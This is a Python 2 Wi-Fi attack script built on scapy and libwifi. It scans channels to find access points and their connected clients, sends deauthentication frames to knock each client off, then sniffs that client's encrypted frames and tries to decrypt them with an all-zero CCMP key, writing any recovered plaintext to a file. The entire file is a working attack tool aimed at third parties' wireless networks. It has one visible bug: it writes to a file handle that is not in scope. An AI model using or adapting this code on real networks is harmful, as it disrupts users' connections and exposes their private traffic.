import threading, os, time, random
from scapy.all import *
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
import libwifi
from libwifi import *

interface = "wlp0s20f0u3mon"

class ChannelHopper:
    def __init__(self):
        self._running = True

    def terminate(self):
        self._running = False

    def hopper(self, iface):
        n = 1
        while self._running:
            time.sleep(0.50)
            os.system('iwconfig %s channel %d' % (iface, n))
            dig = int(random.random() * 14)
            if dig != 0 and dig != n:
                n = dig

def channelChange(iface, channel):
    os.system('iwconfig %s channel %d' % (iface, channel))

APs = {}
Clients = {}
def pkt_callback(pkt):
    channel = 0
    if pkt.haslayer(Dot11Beacon):
        bss = pkt.getlayer(Dot11).addr2.upper()
        try:
            if(len(pkt.getlayer(Dot11Beacon).network_stats()) > 0):
                channel = pkt.getlayer(Dot11Beacon).network_stats()['channel']
        except:
            print "Something goes wrong!!"
            pass
        if not APs.has_key(bss):
            APs[bss] = channel
    elif pkt.haslayer(Dot11) and pkt.getlayer(Dot11).type == 2L and not pkt.haslayer(EAPOL):
        # This means it's data frame.
        sn = pkt.getlayer(Dot11).addr2.upper()
        rc = pkt.getlayer(Dot11).addr1.upper()

        if sn in APs:
            if not Clients.has_key(rc):
                Clients[rc] = {}
                Clients[rc]["bssid"] = sn
                Clients[rc]["channel"] = APs[sn]
            print "AP (%s) > STA (%s)" % (sn, rc)
        elif rc in APs:
            if not Clients.has_key(sn):
                Clients[sn] = {}
                Clients[sn]["bssid"] = rc
                Clients[sn]["channel"] = APs[rc]
            print "AP (%s) < STA (%s)" % (rc, sn)

def checkEncrypt(pkt):
	if(dot11_is_encrypted_data(pkt)):
            data = decrypt_ccmp(pkt, "\x00" * 16)
            #pkt.show()
            print("Data: %s\n" %(data))
            if(data.startswith("\xAA\xAA\x03\x00\x00\x00")):
                print("-------- DATA DECRYPTED ----------\n")
                print("Data: %s" %(data))
                f.write(data)
                pkt.show()
                print("----------------------------------\n")

def deauth(ap, client):
    i = 0
    time.sleep(3)
    while(i<2):
        # Deauthentication Packet For Access Point
        pkt = RadioTap()/Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()
        print("Deauth to: %s" %(client))
        sendp(pkt, iface=interface)
        i += 1

def main():
    try:
        #Start channel hopping
        c = ChannelHopper()
        thread = threading.Thread(target=c.hopper, args=(interface, ), name="hopper")
        #thread.daemon = True
        thread.start()

        #Obtain the essid of the aps
        print("Obtaining the APs and the Clients, dam u wifi!!\n")
        sniff(iface=interface, prn=pkt_callback, count=500)
        print("\n")

        #Stop channel hopping
        c.terminate()
        thread.join()

        #For every essid deauth and capture data
        f = open("Data_Decrypted", "w+")
        print("---------------> Checking vulns!! <-------------\n")
        for client,info in Clients.items():
            t_deauth = threading.Thread(target=deauth, args=(Clients[client]["bssid"], client, ), name="deauth")
            t_deauth.start()
            print("Decrypting data for: %s" %(client))
            #Change channel
            channelChange(interface, Clients[client]["channel"])
            #sniff(iface=interface, prn=checkEncrypt, count=5, lfilter=lambda pkt: (Dot11CCMP in pkt or Dot11TKIP in pkt or Dot11Encrypted in pkt))
            sniff(iface=interface, prn=checkEncrypt, count=100, filter="ether host " + client, timeout=5, lfilter=lambda pkt: (Dot11CCMP in pkt or Dot11TKIP in pkt or Dot11Encrypted in pkt))
            #sniff(iface=interface, prn=checkEncrypt, count=5, lfilter=lambda pkt: (pkt.host==essid))
        f.close()
    except KeyboardInterrupt:
        print("User wants to exit")
        exit(0)

if __name__=='__main__':
    main()
